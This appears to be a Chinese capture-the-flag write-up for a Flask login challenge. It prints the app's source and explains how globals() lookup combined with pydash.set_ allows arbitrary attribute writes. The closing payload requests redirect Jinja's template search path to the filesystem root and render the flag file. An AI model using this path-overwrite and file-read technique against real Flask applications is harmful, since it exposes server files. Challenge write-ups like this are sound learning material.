![](https://cdn.jsdelivr.net/gh/gola-leya/img-bed/img/20260306213135.png)

给了一个登入界面，随便注册登入发现没有任何有用的。

burp抓包看了一下

![image-20260306213220861](C:\Users\22295\AppData\Roaming\Typora\typora-user-images\image-20260306213220861.png)

发现post参数中还有个type，初始值为1，改为0之后再登入会重定向到一个特殊界面。

![](https://cdn.jsdelivr.net/gh/gola-leya/img-bed/img/20260306213350.png)

可以查看配置文件

最重要的是main.py中的 operate 和 impression 两个路由

```
from flask import Flask,request,render_template,redirect,url_for
import json
import pydash

app=Flask(__name__)

database={}
data_index=0
name=''

@app.route('/operate',methods=['GET'])
def operate():
    username=request.args.get('username')
    password=request.args.get('password')
    confirm_password=request.args.get('confirm_password')
    if username in globals() and "old" not in password:
        Username=globals()[username]
        try:
            pydash.set_(Username,password,confirm_password)
            return "oprate success"
        except:
            return "oprate failed"
    else:
        return "oprate failed"


@app.route('/impression',methods=['GET'])
def impression():
    point=request.args.get('point')
    if len(point) > 5:
        return "Invalid request"
    List=["{","}",".","%","<",">","_"]
    for i in point:
        if i in List:
            return "Invalid request"
    return render_template(point)
impression这段限制了我们能输入的字符数量,所以常规的ssti基本不可能
```

一.

核心漏洞:

1./operate任意对象写入

代码中的globals()返回的是当前模块的所有全局对象

例如：

>  'app': Flask对象,
>  'database': dict,
>  'index': function,
>  'login': function,

如果我们传：

```
username=app
```

那么：

```
Username = globals()['app']
```

懂得这一点我们就能根据修改username来控制一些对象

2. `pydash.set_()` 可以深层修改对象属性

函数形式：

```
pydash.set_(obj, path, value)
```

含义：

```
把 value 写入 obj 指定路径的位置
```

等价于：

```
obj[path] = value
```

但 **path 可以是深层路径**。



二.

Flask 使用 **Jinja2 模板引擎**。

默认模板目录是：

```
/app/templates/
```

例如：

```
templates/
 ├ login.html
 ├ admin.html
 └ dashboard.html
```

Jinja 查找模板时，会在：

```
app.jinja_loader.searchpath
```

这个列表里查找。

ps:这点我是问ai的，做的时候根本不知道这个知识点，懂得还是太少了。。。

三

所以利用这两点，我们就可以修改模板默认目录到根目录，然后再依据impression路由里的读取模板函数去尝试读取flag，当然做的时候只是尝试，但是也八九不离十了。

payload：

```
./operate?username=app&password=jinja_loader.searchpath.0&confirm_password=/

./impression?point=flag
```

